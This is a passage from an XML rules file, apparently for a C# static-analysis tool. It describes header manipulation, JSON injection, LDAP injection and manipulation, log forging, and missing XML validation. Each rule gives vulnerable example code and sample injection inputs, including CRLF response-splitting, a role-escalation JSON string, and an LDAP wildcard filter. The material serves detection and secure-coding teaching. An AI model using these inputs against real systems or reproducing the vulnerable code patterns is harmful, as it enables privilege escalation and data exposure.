																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_header_manipulation_cookies</key>
    <internalKey>Input Validation and Representation/Header Manipulation/Cookies</internalKey>
    <name>Header Manipulation: Cookies</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Including unvalidated data in Cookies can lead to HTTP Response header manipulation and enable cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cookie Manipulation vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source, most frequently an HTTP request.<br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br>2. The data is included in an HTTP cookie sent to a web user without being validated.<br><br>As with many software security vulnerabilities, cookie manipulation is a means to an end, not an end in itself. At its root, the vulnerability is straightforward: an attacker passes malicious data to a vulnerable application, and the application includes the data in an HTTP cookie.<br><br><b>Cookie Manipulation:</b> When combined with attacks like Cross-Site Request Forgery, attackers can change, add to, or even overwrite a legitimate user's cookies.<br><br>Being an HTTP Response header, cookie manipulation attacks can also lead to other types of attacks like:<br><br><b>HTTP Response Splitting:</b><br>One of the most common Header Manipulation attacks is HTTP Response Splitting. To mount a successful HTTP Response Splitting exploit, the application must allow input that contains CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n)characters into the header. These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but also allows them to create additional responses entirely under their control.<br><br>Many of today's modern application servers will prevent the injection of malicious characters into HTTP headers. For example, recent versions of Apache Tomcat will throw an <code>IllegalArgumentException</code> if you attempt to set a header with prohibited characters. If your application server prevents setting headers with new line characters, then your application is not vulnerable to HTTP Response Splitting. However, solely filtering for new line characters can leave an application vulnerable to Cookie Manipulation or Open Redirects, so care must still be taken when setting HTTP headers with user input.<br><br><b>Example:</b> The following code segment reads the name of the author of a weblog entry, <code>author</code>, from an HTTP request and sets it in a cookie header of an HTTP response.<br><br><pre><br>protected System.Web.UI.WebControls.TextBox Author;<br>...<br>string author = Author.Text;<br>Cookie cookie = new Cookie("author", author);<br>...<br></pre><br><br>Assuming a string consisting of standard alpha-numeric characters, such as "Jane Smith", is submitted in the request the HTTP response including this cookie might take the following form:<br><br><pre><br>HTTP/1.1 200 OK<br>...<br>Set-Cookie: author=Jane Smith<br>...<br></pre><br><br>However, because the value of the cookie is formed of unvalidated user input the response will only maintain this form if the value submitted for <code>AUTHOR_PARAM</code> does not contain any CR and LF characters. If an attacker submits a malicious string, such as "Wiley Hacker\r\nHTTP/1.1 200 OK\r\n...", then the HTTP response would be split into two responses of the following form:<br><br><pre><br>HTTP/1.1 200 OK<br>...<br>Set-Cookie: author=Wiley Hacker<br><br>HTTP/1.1 200 OK<br>...<br></pre><br><br>Clearly, the second response is completely controlled by the attacker and can be constructed with any header and body content desired. The ability of attacker to construct arbitrary HTTP responses permits a variety of resulting attacks, including: cross-user defacement, web and browser cache poisoning, cross-site scripting and page hijacking.<br><br><b>Cross-User Defacement:</b> An attacker can make a single request to a vulnerable server that will cause the server to create two responses, the second of which may be misinterpreted as a response to a different request, possibly one made by another user sharing the same TCP connection with the server. This can be accomplished by convincing the user to submit the malicious request themselves, or remotely in situations where the attacker and the user share a common TCP connection to the server, such as a shared proxy server. In the best case, an attacker can leverage this ability to convince users that the application has been hacked, causing users to lose confidence in the security of the application. In the worst case, an attacker may provide specially crafted content designed to mimic the behavior of the application but redirect private information, such as account numbers and passwords, back to the attacker.<br><br><b>Cache Poisoning:</b> The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even the browser cache of a single user. If a response is cached in a shared web cache, such as those commonly found in proxy servers, then all users of that cache will continue receive the malicious content until the cache entry is purged. Similarly, if the response is cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is purged, although only the user of the local browser instance will be affected.<br><br><b>Cross-Site Scripting:</b> Once attackers have control of the responses sent by an application, they have a choice of a variety of malicious content to provide users. Cross-site scripting is common form of attack where malicious JavaScript or other code included in a response is executed in the user's browser. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. The most common and dangerous attack vector against users of a vulnerable application uses JavaScript to transmit session and authentication information back to the attacker who can then take complete control of the victim's account.<br><br><b>Page Hijacking:</b> In addition to using a vulnerable application to send malicious content to a user, the same root vulnerability can also be leveraged to redirect sensitive content generated by the server and intended for the user to the attacker instead. By submitting a request that results in two responses, the intended response from the server and the response generated by the attacker, an attacker can cause an intermediate node, such as a shared proxy server, to misdirect a response generated by the server for the user to the attacker. Because the request made by the attacker generates two responses, the first is interpreted as a response to the attacker's request, while the second remains in limbo. When the user makes a legitimate request through the same TCP connection, the attacker's request is already waiting and is interpreted as a response to the victim's request. The attacker then sends a second request to the server, to which the proxy server responds with the server generated request intended for the victim, thereby compromising any sensitive information in the headers or body of the response intended for the victim.<br><br><b>Open Redirect:</b> Allowing unvalidated input to control the URL used in a redirect can aid phishing attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 113</em> <br></p>
																									   <p>[11] A. Klein <em>Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</em> <br></p>
																									   <p>[12] D. Crab <em>HTTP Response Splitting</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>HTTP Response Splitting</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_json_injection</key>
    <internalKey>Input Validation and Representation/JSON Injection</internalKey>
    <name>JSON Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The method writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  JSON injection occurs when:<br><br>1. Data enters a program from an untrusted source.<br><br><br>2. The data is written to a JSON stream.<br><br>Applications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.<br><br>The semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as that involving JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.<br><br><b>Example 1: </b>The following C# code uses JSON.NET to serialize user account authentication information for non-privileged users (those with a role of "default" as opposed to privileged users with a role of "admin") from user-controlled input variables <code>username</code> and <code>password</code> to the JSON file located at <code>C:\user_info.json</code>:<br><br><pre><br>...<br><br>StringBuilder sb = new StringBuilder();<br>StringWriter sw = new StringWriter(sb);<br><br>using (JsonWriter writer = new JsonTextWriter(sw))<br>{<br>  writer.Formatting = Formatting.Indented;<br><br>  writer.WriteStartObject();<br><br>    writer.WritePropertyName("role");<br>    writer.WriteRawValue("\"default\"");<br><br>    writer.WritePropertyName("username");<br>    writer.WriteRawValue("\"" + username + "\"");<br><br>    writer.WritePropertyName("password");<br>    writer.WriteRawValue("\"" + password + "\"");<br><br>  writer.WriteEndObject();<br>}<br><br>File.WriteAllText(@"C:\user_info.json", sb.ToString());<br></pre><br><br>Yet, because the JSON serialization is performed using <code>JsonWriter.WriteRawValue()</code>, the untrusted data in <code>username</code> and <code>password</code> will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user <code>mallory</code> with password <code>Evil123!</code> were to append <code>","role":"admin</code> to her username when entering it at the prompt that sets the value of the <code>username</code> variable, the resulting JSON saved to <code>C:\user_info.json</code> would be:<br><br><pre><br>{<br>  "role":"default",<br>  "username":"mallory",<br>  "role":"admin",<br>  "password":"Evil123!"<br>}<br></pre><br><br>If this serialized JSON file were then deserialized to a <code>Dictionary</code> object with <code>JsonConvert.DeserializeObject()</code> as so:<br><br><pre><br>String jsonString = File.ReadAllText(@"C:\user_info.json");<br><br>Dictionary&lt;string, string&gt; userInfo = JsonConvert.DeserializeObject&lt;Dictionary&lt;string, strin&gt;&gt;(jsonString);<br></pre><br><br>The resulting values for the <code>username</code>, <code>password</code>, and <code>role</code> keys in the <code>Dictionary</code> object would be <code>mallory</code>, <code>Evil123!</code>, and <code>admin</code> respectively. Without further verification that the deserialized JSON values are valid, the application will incorrectly assign user <code>mallory</code> "admin" privileges.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 91</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_ldap_injection</key>
    <internalKey>Input Validation and Representation/LDAP Injection</internalKey>
    <name>LDAP Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic LDAP filter with user input could allow an attacker to modify the statement's meaning.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  LDAP injection errors occur when:<br><br>1.	Data enters a program from an untrusted source.<br><br>2.	The data is used to dynamically construct a LDAP filter.<br><br><b>Example 1:</b> The following code dynamically constructs and executes an LDAP query that retrieves records for all the employees who report to a given manager. The manager's name is read from an HTTP request, and is therefore untrusted.<br><br><pre><br>...<br>DirectorySearcher src =<br>           new DirectorySearcher("(manager=" + managerName.Text + ")");<br>src.SearchRoot = de;<br>src.SearchScope = SearchScope.Subtree;<br><br>foreach(SearchResult res in src.FindAll()) {<br>  ...<br>}<br></pre><br><br>Under normal conditions, such as searching for employees who report to the manager John Smith, the filter that this code executes will look like the following:<br><br><pre><br>(manager=Smith, John)<br></pre><br><br>However, because the filter is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>managerName</code> does not contain any LDAP meta characters. If an attacker enters the string <code>Hacker, Wiley)(|(objectclass=*)</code> for <code>managerName</code>, then the query becomes the following:<br><br><pre><br>(manager=Hacker, Wiley)(|(objectclass=*))<br></pre><br><br>Based on the permissions with which the query is executed, the addition of the <code>|(objectclass=*)</code> condition causes the filter to match against all entries in the directory, and allows the attacker to retrieve information about the entire pool of users. Depending on the permissions with which the LDAP query is performed, the breadth of this attack may be limited, but if the attacker can control the command structure of the query, such an attack can at least affect all records that the user the LDAP query is executed as can access.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 90</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>LDAP Injection</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_ldap_manipulation</key>
    <internalKey>Input Validation and Representation/LDAP Manipulation</internalKey>
    <name>LDAP Manipulation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Executing an LDAP statement that contains a user-controlled value outside the filter string can allow an attacker to alter the statement's meaning or execute arbitrary LDAP commands.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  LDAP manipulation errors occur when:<br><br>1.	Data enters a program from an untrusted source.<br><br>2.	The data is used outside the filter string in a dynamic LDAP statement.<br><br><b>Example 1:</b> The following code reads an <code>ou</code> string from a hidden field submitted through an HTTP request and uses it to create a new <code>DirectoryEntry</code>.<br><br><pre><br>...<br>de = new DirectoryEntry("LDAP://ad.example.com:389/ou="<br>                        + hiddenOU.Text + ",dc=example,dc=com");<br>...<br></pre><br><br>Because the connection string includes user input and is performed under an anonymous bind, an attacker could alter the results of the query by specifying an unexpected <code>ou</code> value. The problem is that the developer failed to leverage the appropriate access control mechanisms necessary to restrict subsequent queries to access only employee records the current user is permitted to read.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 90</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_log_forging</key>
    <internalKey>Input Validation and Representation/Log Forging</internalKey>
    <name>Log Forging</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Writing unvalidated user input to log files can allow an attacker to forge log entries or inject malicious content into the logs.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Log forging vulnerabilities occur when:<br><br>1.Data enters an application from an untrusted source.<br><br>2.The data is written to an application or system log file.<br><br>Applications typically use log files to store a history of events or transactions for later review, statistics gathering, or debugging. Depending on the nature of the application, the task of reviewing log files may be performed manually on an as-needed basis or automated with a tool that automatically culls logs for important events or trending information.<br><br>Interpretation of the log files may be hindered or misdirected if an attacker can supply data to the application that is subsequently logged verbatim. In the most benign case, an attacker may be able to insert false entries into the log file by providing the application with input that includes appropriate characters. If the log file is processed automatically, the attacker can render the file unusable by corrupting the format of the file or injecting unexpected characters. A more subtle attack might involve skewing the log file statistics. Forged or otherwise, corrupted log files can be used to cover an attacker's tracks or even to implicate another party in the commission of a malicious act [1]. In the worst case, an attacker may inject code or other commands into the log file and take advantage of a vulnerability in the log processing utility [2].<br><br><b>Example:</b> The following web application code attempts to read an integer value from a request object. If the value fails to parse as an integer, then the input is logged with an error message indicating what happened.<br><br><pre><br>...<br>string val = (string)Session["val"];<br>try {<br>int value = Int32.Parse(val);<br>}<br>catch (FormatException fe) {<br>log.Info("Failed to parse val= " + val);<br>}<br>...<br></pre><br><br>If a user submits the string "<code>twenty-one</code>" for <code>val</code>, the following entry is logged:<br><br><pre><br>INFO: Failed to parse val=twenty-one<br></pre><br><br>However, if an attacker submits the string "<code>twenty-one%0a%0aINFO:+User+logged+out%3dbadguy</code>", the following entry is logged:<br><br><pre><br>INFO: Failed to parse val=twenty-one<br><br>INFO: User logged out=badguy<br></pre><br><br>Clearly, attackers can use this same mechanism to insert arbitrary log entries.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>AU, SI</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AU-9 Protection of Audit Information (P1)</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 117</em> <br></p>
																									   <p>[13] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2, Requirement 10.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1, Requirement 10.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1, Requirement 10.5.2</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1, Requirement 10.5.2</em> <br></p>
																									   <p>[19] A. Muffet <em>The night the log was forged.</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_missing_xml_validation</key>
    <internalKey>Input Validation and Representation/Missing XML Validation</internalKey>
    <name>Missing XML Validation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Failure to enable validation when parsing XML gives an attacker the opportunity to supply malicious input.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input. It is not possible for an XML parser to validate all aspects of a document's content; a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 112</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1, Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[18]  <em>XmlReader Class</em> Microsoft<br></p>
																									   <p>[19]  <em>XmlReaderSettings Class</em> Microsoft<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_missing_xml_validation_validating_reader</key>
    <internalKey>Input Validation and Representation/Missing XML Validation(validating_reader)</internalKey>
    <name>Missing XML Validation(validating_reader)</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
